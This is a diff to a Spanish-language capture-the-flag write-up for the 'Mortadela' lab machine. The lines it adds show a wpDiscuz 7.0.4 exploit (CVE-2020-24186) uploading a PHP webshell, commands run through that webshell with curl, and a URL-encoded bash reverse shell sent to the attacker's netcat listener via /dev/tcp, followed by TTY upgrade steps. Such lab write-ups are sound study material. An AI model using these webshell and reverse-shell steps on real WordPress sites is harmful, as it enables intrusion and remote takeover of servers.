@@ -19,7 +19,9 @@ En este caso voy a utilizar la herramienta netdiscover para detectar la ip de la
 ```
 -r : elegir el rango de de la red   
 En este caso al ser una maquina virtual los primero 24 bits siempre son "08:00:27:XX:XX:XX"
-
+Entonces ya sabemos las IPs
+IP maquina victima: 10.0.0.156
+IP maquina atacante(mia): 10.0.0.105
 Ahora vamos a hacer un escaneo rapido para saber que puertos se encuentran abiertos
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -106,9 +108,14 @@ Progress: 220560 / 220561 (100.00%)
 Finished
 ===============================================================
 ```
-Vemos que nos encontramos con un wordpress, si visitamos la pagina nos encontramos con esto
+Vemos que nos encontramos con un wordpress, si visitamos la pagina nos encontramos con esto,
 
 ![Imagen2](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_lTDXfA7RCb.png?raw=true)
+Y mas abajo nos encontramos con la primera entrada entrada del wordpress
+![Imagen2](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_PEmTwHY6Xp.png?raw=true)
+Al mirar a donde nos redirige parece que es otra ip, pero lo importante es donde esta ubicada la primera entrada del wordpress, mas tarde sera mas util
+
+ 
 Al ser un wordpress tenemos la herramienta wpscan que sirve para enumerar y buscar vulneravilidades, primero vamos a hacer un escaneo basico
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -298,3 +305,123 @@ Si analizamos los resultados podemos observar que hemos podido encontrar 2 plugi
 Buscando el google por alguna vulneravilidad del plugin "wpdiscuz" con la version 7.0.4 , nos encontramos bastantes exploits
 
 ![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_XNE4QOhqRF.png?raw=true)
+
+En mi caso voy a utilizar este exploit https://www.exploit-db.com/exploits/49967
+Nos lo descargamos
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ wget https://www.exploit-db.com/raw/49967                               
+--2024-04-05 15:04:46--  https://www.exploit-db.com/raw/49967
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5719 (5.6K) [text/plain]
+Saving to: ‘49967’
+
+49967                                     100%[===================================================================================>]   5.58K  --.-KB/s    in 0s      
+
+2024-04-05 15:04:47 (156 MB/s) - ‘49967’ saved [5719/5719]
+
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ ls -la
+total 16
+drwxr-xr-x 2 kali kali 4096 Apr  5 15:04 .
+drwxr-xr-x 3 kali kali 4096 Apr  5 15:04 ..
+-rw-r--r-- 1 kali kali 5719 Apr  5 15:04 49967
+
+
+```
+Si leemos el exploit nos muestra un ejemplo de uso:
+```bash
+
+[+] Specify an url target
+[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
+[+] Example help usage: exploit.py -h
+
+```
+Entonces lo adaptamos a nuestro entorno, como anteriormente mencione, ahora nos sera util en donde esta ubicada la primera entrada del wordpress ya que hay que proporcionarsela al exploit, en mi entorno quedaria asi
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ python3 49967 -u http://10.0.0.156/wordpress -p /index.php/2024/04/01/hola-mundo/
+/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
+---------------------------------------------------------------
+[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
+[-] File Upload Bypass Vulnerability - PHP Webshell Upload
+[-] CVE: CVE-2020-24186
+[-] https://github.com/hevox
+--------------------------------------------------------------- 
+
+[+] Response length:[93974] | code:[200]
+[!] Got wmuSecurity value: e5e00c22c0
+[!] Got wmuSecurity value: 1 
+
+[+] Generating random name for Webshell...
+[!] Generated webshell name: rokganqjscduehq
+
+[!] Trying to Upload Webshell..
+[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php&quot; 
+
+> id
+
+[x] Failed to execute PHP code...
+
+```
+Como se ve parece que al intentar manda algo nos da error, pero si miramos en la url que nos ha proporcionado, parece que ha subido la webshell exitosamente, ahora cambiamos la ip que nos da por la nuestra, ya que parece que es un fallo del wordpress(el error de mandar una ejecucion de comandos puede ser devido al redirect) 
+ 
+Con curl podemos ejecutar comandos ya que se trata de una webshell (no hay que poner el &quot; en la url)
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ curl http://10.0.0.156/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php?cmd=id
+GIF689a;
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+▒�   
+```
+Por lo que ya podemos gererarnos una revshell en nuestra terminal, primero ponemos una terminal en escucha
+```bash
+Terminal 1
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9020
+listening on [any] 9020 ...
+
+```
+En la otra terminal tenermos que mandar la ejecucion de comandos para que cree una revshell, por lo que primero tenemos que crear la revshell 
+
+Hay que urlencodearla ya que al pasarla con curl nos da muchos problemas ya que interpreta espacios y otros caracteres( la ip utilizada es la de la maquina atacante)
+```bash
+Terminal 2
+
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ urlencode "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.105/9020 0>&1'"
+%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.105%2F9020%200%3E%261%27
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ curl http://10.0.0.156/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php?cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.105%2F9020%200%3E%261%27
+
+```
+Ahora si me voy a la terminal 1 nos encontramos que hemos establecido conexion
+```bash
+Terminal 1
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9020
+listening on [any] 9020 ...
+connect to [10.0.0.105] from (UNKNOWN) [10.0.0.156] 43702
+bash: cannot set terminal process group (577): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$
+```
+Ahora vamos a hacer el tratamiento de la TTY para que sea mas interactiva
+```bash
+www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ script /dev/null -c bash               
+www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ ^Z
+zsh: suspended  nc -lvnp 9020
+
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 9020
+reset xterm                     
+www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ export TERM=xterm
+```
+Ahora solo nos queda buscar como escalar privilegios, si vamos enumerando podemos observar que hay un archivo en /opt
